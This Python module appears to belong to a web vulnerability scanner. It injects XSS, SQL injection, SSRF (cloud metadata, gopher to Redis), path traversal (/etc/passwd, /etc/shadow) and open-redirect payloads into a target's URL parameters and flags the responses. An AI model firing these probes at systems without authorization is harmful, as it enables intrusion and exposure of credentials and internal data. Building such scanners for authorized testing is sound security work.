"""Vulnerability testing module: XSS, SQLi, SSRF, IDOR, LFI, Open Redirect."""
import urllib.parse
import re
from core.banner import C
from core.session import Finding
from core import http_client


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '{{7*7}}',                        # SSTI check
    '${7*7}',
    '<iframe src="javascript:alert(1)">',
    '"><details open ontoggle=alert(1)>',
    'javascript:alert(1)',
    '" onmouseover="alert(1)',
]

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "1; SELECT SLEEP(2)--",
    "1' AND SLEEP(2)--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",    # triggers error if columns < 100
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"sql syntax.*mysql",
    r"syntax error.*postgresql",
    r"ORA-\d{5}",           # Oracle
    r"Microsoft OLE DB",
    r"ODBC.*Driver",
    r"SQLite.*error",
    r"pg_query\(\)",
    r"PSQLException",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://metadata.google.internal/",            # GCP metadata
    "http://169.254.169.254/metadata/v1/",         # DigitalOcean
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0/",
    "http://2130706433/",   # 127.0.0.1 decimal
    "file:///etc/passwd",
    "dict://localhost:6379/info",
    "gopher://localhost:6379/_INFO",
    "http://burpcollaborator.net",   # placeholder - replace with your OOB domain
]

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "data://text/plain,<?php phpinfo();?>",
]

LFI_INDICATORS = [
    r"root:.*:0:0:",
    r"\[fonts\]",            # win.ini
    r"PD9waHA",              # base64 <?php
    r"\[extensions\]",
    r"nobody:.*:/",
    r"daemon:.*:/",
]

# Open Redirect payloads
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "///evil.com",
    "////evil.com",
    "https://evil.com/%2f..",
    "//%09/evil.com",
    "//evil%00.com",
    "https:evil.com",
    "http://evil.com@target.com",
    "https://evil.com#@target.com",
    "/.evil.com",
    "///evil.com/%2f%2e%2e",
    "////evil.com/%2f%2e%2e",
    "https://evil。com",  # fullwidth dot
    "https://evil%E3%80%82com",
]

# Redirect parameter names to test
REDIRECT_PARAMS = [
    "url", "redirect", "return", "next", "redir", "redirect_uri",
    "return_url", "returnTo", "goto", "continue", "dest", "destination",
    "redirect_to", "callback", "forward", "out", "view", "target",
    "link", "ref",
]

# Common IDOR parameter names
IDOR_PARAMS = [
    "id", "user_id", "userId", "uid", "account_id", "accountId",
    "order_id", "orderId", "invoice_id", "record_id", "file_id",
    "doc_id", "document_id", "profile_id", "customer_id",
]


# ── HTTP helper ───────────────────────────────────────────────────────────────

def _get(url, timeout=6, headers=None, follow_redirects=True):
    return http_client.get(
        url,
        timeout=timeout,
        headers=headers,
        max_body=100_000,
        follow_redirects=follow_redirects,
    )


def _post(url, data: dict, timeout=6, headers=None, follow_redirects=True):
    return http_client.post(
        url,
        data=data,
        timeout=timeout,
        headers=headers,
        max_body=100_000,
        follow_redirects=follow_redirects,
    )


def _inject_params(url: str, payload: str) -> list[str]:
    """Return list of URLs with each query param replaced by payload."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return [url + f"?test={urllib.parse.quote(payload)}"]
    urls = []
    for key in params:
        new_params = dict(params)
        new_params[key] = [payload]
        new_q = urllib.parse.urlencode(new_params, doseq=True)
        urls.append(parsed._replace(query=new_q).geturl())
    return urls


def _redirect_target_matches(value: str, target_host: str = "evil.com") -> bool:
    normalized = urllib.parse.unquote(value or "").lower()
    normalized = normalized.replace("。", ".").replace("\\", "/").strip()
    return target_host in normalized


def _is_client_side_redirect(body: str, target_host: str = "evil.com") -> bool:
    lower = body.lower()
    if not _redirect_target_matches(lower, target_host):
        return False
    redirect_markers = (
        "location.href",
        "window.location",
        "window.open(",
        'http-equiv="refresh"',
        "http-equiv='refresh'",
    )
    return any(marker in lower for marker in redirect_markers)


def _normalized_body(body: str, *ids: int) -> str:
    snippet = body[:5000]
    for current_id in ids:
        snippet = re.sub(rf"\b{re.escape(str(current_id))}\b", "{id}", snippet)
    return re.sub(r"\s+", " ", snippet).strip()


# ── Module ────────────────────────────────────────────────────────────────────

class VulnModule:
    def __init__(self, session):
        self.s = session

    # ── XSS ──────────────────────────────────────────────────────────────────
    def test_xss(self, url=None):
        url = url or self.s.target
        print(C.section(f"XSS TESTING"))
        print(C.info(f"Target: {url}"))
        print(C.info(f"Payloads: {len(XSS_PAYLOADS)}"))

        found = False
        for payload in XSS_PAYLOADS:
            injected_urls = _inject_params(url, payload)
            for test_url in injected_urls:
                resp = _get(test_url)
                if resp.error:
                    continue
                # Check if payload is reflected unencoded
                if payload in resp.body:
                    self.s.add_finding(Finding(
                        title="Reflected XSS",
                        severity="high",
                        description=(
                            f"Payload reflected unencoded in response body.\n"
                            f"  Payload: {payload}"
                        ),
                        url=test_url,
                        evidence=f"Payload found in response: {payload}",
                        module="vuln.xss"
                    ))
                    found = True
                    break
            if found:
                break  # one confirmed finding is enough for now

        if not found:
            print(C.ok("No reflected XSS found with current payloads"))
        print(C.ok("XSS test complete"))

    # ── SQL Injection ─────────────────────────────────────────────────────────
    def test_sqli(self, url=None):
        url = url or self.s.target
        print(C.section("SQL INJECTION TESTING"))
        print(C.info(f"Target: {url}"))

        found = False
        for payload in SQLI_PAYLOADS:
            injected_urls = _inject_params(url, payload)
            for test_url in injected_urls:
                resp = _get(test_url)
                if resp.error:
                    continue
                body_lower = resp.body.lower()
                for err_pattern in SQLI_ERRORS:
                    if re.search(err_pattern, body_lower, re.IGNORECASE):
                        self.s.add_finding(Finding(
                            title="SQL Injection (Error-based)",
                            severity="critical",
                            description=(
                                f"SQL error detected in response.\n"
                                f"  Payload: {payload}\n"
                                f"  Pattern: {err_pattern}"
                            ),
                            url=test_url,
                            evidence=f"Error pattern matched: {err_pattern}",
                            module="vuln.sqli"
                        ))
                        found = True
                        break
                if found:
                    break
            if found:
                break

        if not found:
            print(C.warn("No error-based SQLi found (consider time-based or manual testing)"))
        print(C.ok("SQLi test complete"))

    # ── SSRF ──────────────────────────────────────────────────────────────────
    def test_ssrf(self, url=None):
        url = url or self.s.target
        print(C.section("SSRF TESTING"))
        print(C.info(f"Target: {url}"))
        print(C.warn("Note: blind SSRF requires an OOB callback server (Burp Collaborator, interactsh)"))

        ssrf_indicators = [
            r"root:.*:0:0:",           # /etc/passwd
            r"ami-id",                  # AWS metadata
            r"instance-id",
            r"iam/security-credentials",
            r'"computeMetadata"',       # GCP
            r"droplet_id",              # DigitalOcean
            r"redis_version",
        ]

        for payload in SSRF_PAYLOADS:
            injected_urls = _inject_params(url, payload)
            for test_url in injected_urls:
                resp = _get(test_url)
                if resp.error:
                    continue
                for indicator in ssrf_indicators:
                    if re.search(indicator, resp.body, re.IGNORECASE):
                        self.s.add_finding(Finding(
                            title="SSRF — Internal resource access",
                            severity="critical",
                            description=(
                                f"Response contains internal resource content.\n"
                                f"  Payload: {payload}"
                            ),
                            url=test_url,
                            evidence=f"Indicator: {indicator}",
                            module="vuln.ssrf"
                        ))

        print(C.ok("SSRF test complete"))

    # ── IDOR ──────────────────────────────────────────────────────────────────
    def test_idor(self, url=None):
        url = url or self.s.target
        print(C.section("IDOR DETECTION"))
        print(C.info(f"Analyzing: {url}"))

        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        findings_count = 0

        # Check for numeric ID params
        for param, values in params.items():
            if param.lower() in [p.lower() for p in IDOR_PARAMS] or values[0].isdigit():
                try:
                    current_id = int(values[0])
                except ValueError:
                    continue

                # Fetch original
                baseline = _get(url)
                if baseline.error or baseline.status == 0:
                    continue
                baseline_body = baseline.body
                baseline_normalized = _normalized_body(baseline_body, current_id)

                # Try adjacent IDs
                for delta in (-1, +1, 999, 1000):
                    new_id = current_id + delta
                    if new_id <= 0:
                        continue
                    new_params = dict(params)
                    new_params[param] = [str(new_id)]
                    new_q = urllib.parse.urlencode(new_params, doseq=True)
                    test_url = parsed._replace(query=new_q).geturl()
                    candidate = _get(test_url)
                    if candidate.error or candidate.status == 0:
                        continue

                    status_new = candidate.status
                    body_new = candidate.body
                    if status_new != 200 or len(body_new) <= 100:
                        continue

                    if body_new == baseline_body:
                        continue

                    normalized_candidate = _normalized_body(body_new, current_id, new_id)
                    if normalized_candidate == baseline_normalized:
                        continue

                    if abs(len(body_new) - len(baseline_body)) > 25:
                        self.s.add_finding(Finding(
                            title=f"IDOR candidate on param '{param}'",
                            severity="info",
                            description=(
                                f"ID parameter '{param}' returned a materially different response for id={new_id}.\n"
                                f"  Manual verification with authenticated accounts is required before reporting."
                            ),
                            url=test_url,
                            evidence=(
                                f"Param: {param}, tested id: {new_id}, status={status_new}, "
                                f"length_delta={len(body_new) - len(baseline_body)}"
                            ),
                            module="vuln.idor"
                        ))
                        findings_count += 1

        # Check path-based IDs
        path_id_pattern = re.compile(r"/(\d+)(?:/|$)")
        matches = path_id_pattern.findall(parsed.path)
        if matches:
            print(C.info(f"Path-based IDs found: {matches} — consider manual IDOR testing"))
            self.s.add_finding(Finding(
                title="Path-based ID — manual IDOR testing recommended",
                severity="info",
                description=f"URL path contains numeric IDs: {matches}. Try accessing other users' resources.",
                url=url,
                module="vuln.idor"
            ))

        if findings_count == 0 and not matches:
            print(C.ok("No obvious IDOR parameters detected"))
        print(C.ok("IDOR test complete"))

    # ── LFI / Path Traversal ──────────────────────────────────────────────────
    def test_lfi(self, url=None):
        url = url or self.s.target
        print(C.section("LFI / PATH TRAVERSAL TESTING"))
        print(C.info(f"Target: {url}"))

        for payload in LFI_PAYLOADS:
            injected_urls = _inject_params(url, payload)
            for test_url in injected_urls:
                resp = _get(test_url)
                if resp.error:
                    continue
                for indicator in LFI_INDICATORS:
                    if re.search(indicator, resp.body):
                        self.s.add_finding(Finding(
                            title="Local File Inclusion (LFI)",
                            severity="critical",
                            description=(
                                f"File content found in response.\n"
                                f"  Payload: {payload}"
                            ),
                            url=test_url,
                            evidence=f"Indicator matched: {indicator}",
                            module="vuln.lfi"
                        ))

        print(C.ok("LFI test complete"))

    # ── Open Redirect ────────────────────────────────────────────────────────
    def test_open_redirect(self, url=None):
        url = url or self.s.target
        print(C.section("OPEN REDIRECT TESTING"))
        print(C.info(f"Target: {url}"))
        print(C.info(f"Payloads: {len(REDIRECT_PAYLOADS)}, Params: {len(REDIRECT_PARAMS)}"))

        found = False
        parsed = urllib.parse.urlparse(url)
        existing_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        # Test existing redirect-like params
        redirect_like = [p for p in existing_params
                         if p.lower() in [rp.lower() for rp in REDIRECT_PARAMS]]

        # Also inject into known redirect params
        params_to_test = set(redirect_like)
        for rp in REDIRECT_PARAMS[:8]:  # limit to top 8
            params_to_test.add(rp)

        for param in params_to_test:
            for payload in REDIRECT_PAYLOADS:
                test_params = {key: list(values) for key, values in existing_params.items()}
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()

                resp = _get(test_url, follow_redirects=False)
                if resp.error or resp.status == 0:
                    continue

                indicator = ""
                location = resp.header("Location")
                if 300 <= resp.status < 400 and _redirect_target_matches(location):
                    indicator = f"HTTP {resp.status} Location: {location}"
                elif _is_client_side_redirect(resp.body):
                    indicator = "Client-side redirect reference to evil.com detected in response body"

                if indicator:
                    self.s.add_finding(Finding(
                        title=f"Open Redirect via '{param}'",
                        severity="medium",
                        description=(
                            f"Redirect target observed without following the redirect.\n"
                            f"  Parameter: {param}\n"
                            f"  Payload: {payload}"
                        ),
                        url=test_url,
                        evidence=indicator,
                        module="vuln.open_redirect"
                    ))
                    found = True
                    break
            if found:
                break

        if not found:
            print(C.ok("No open redirect found with current payloads"))
        print(C.ok("Open redirect test complete"))
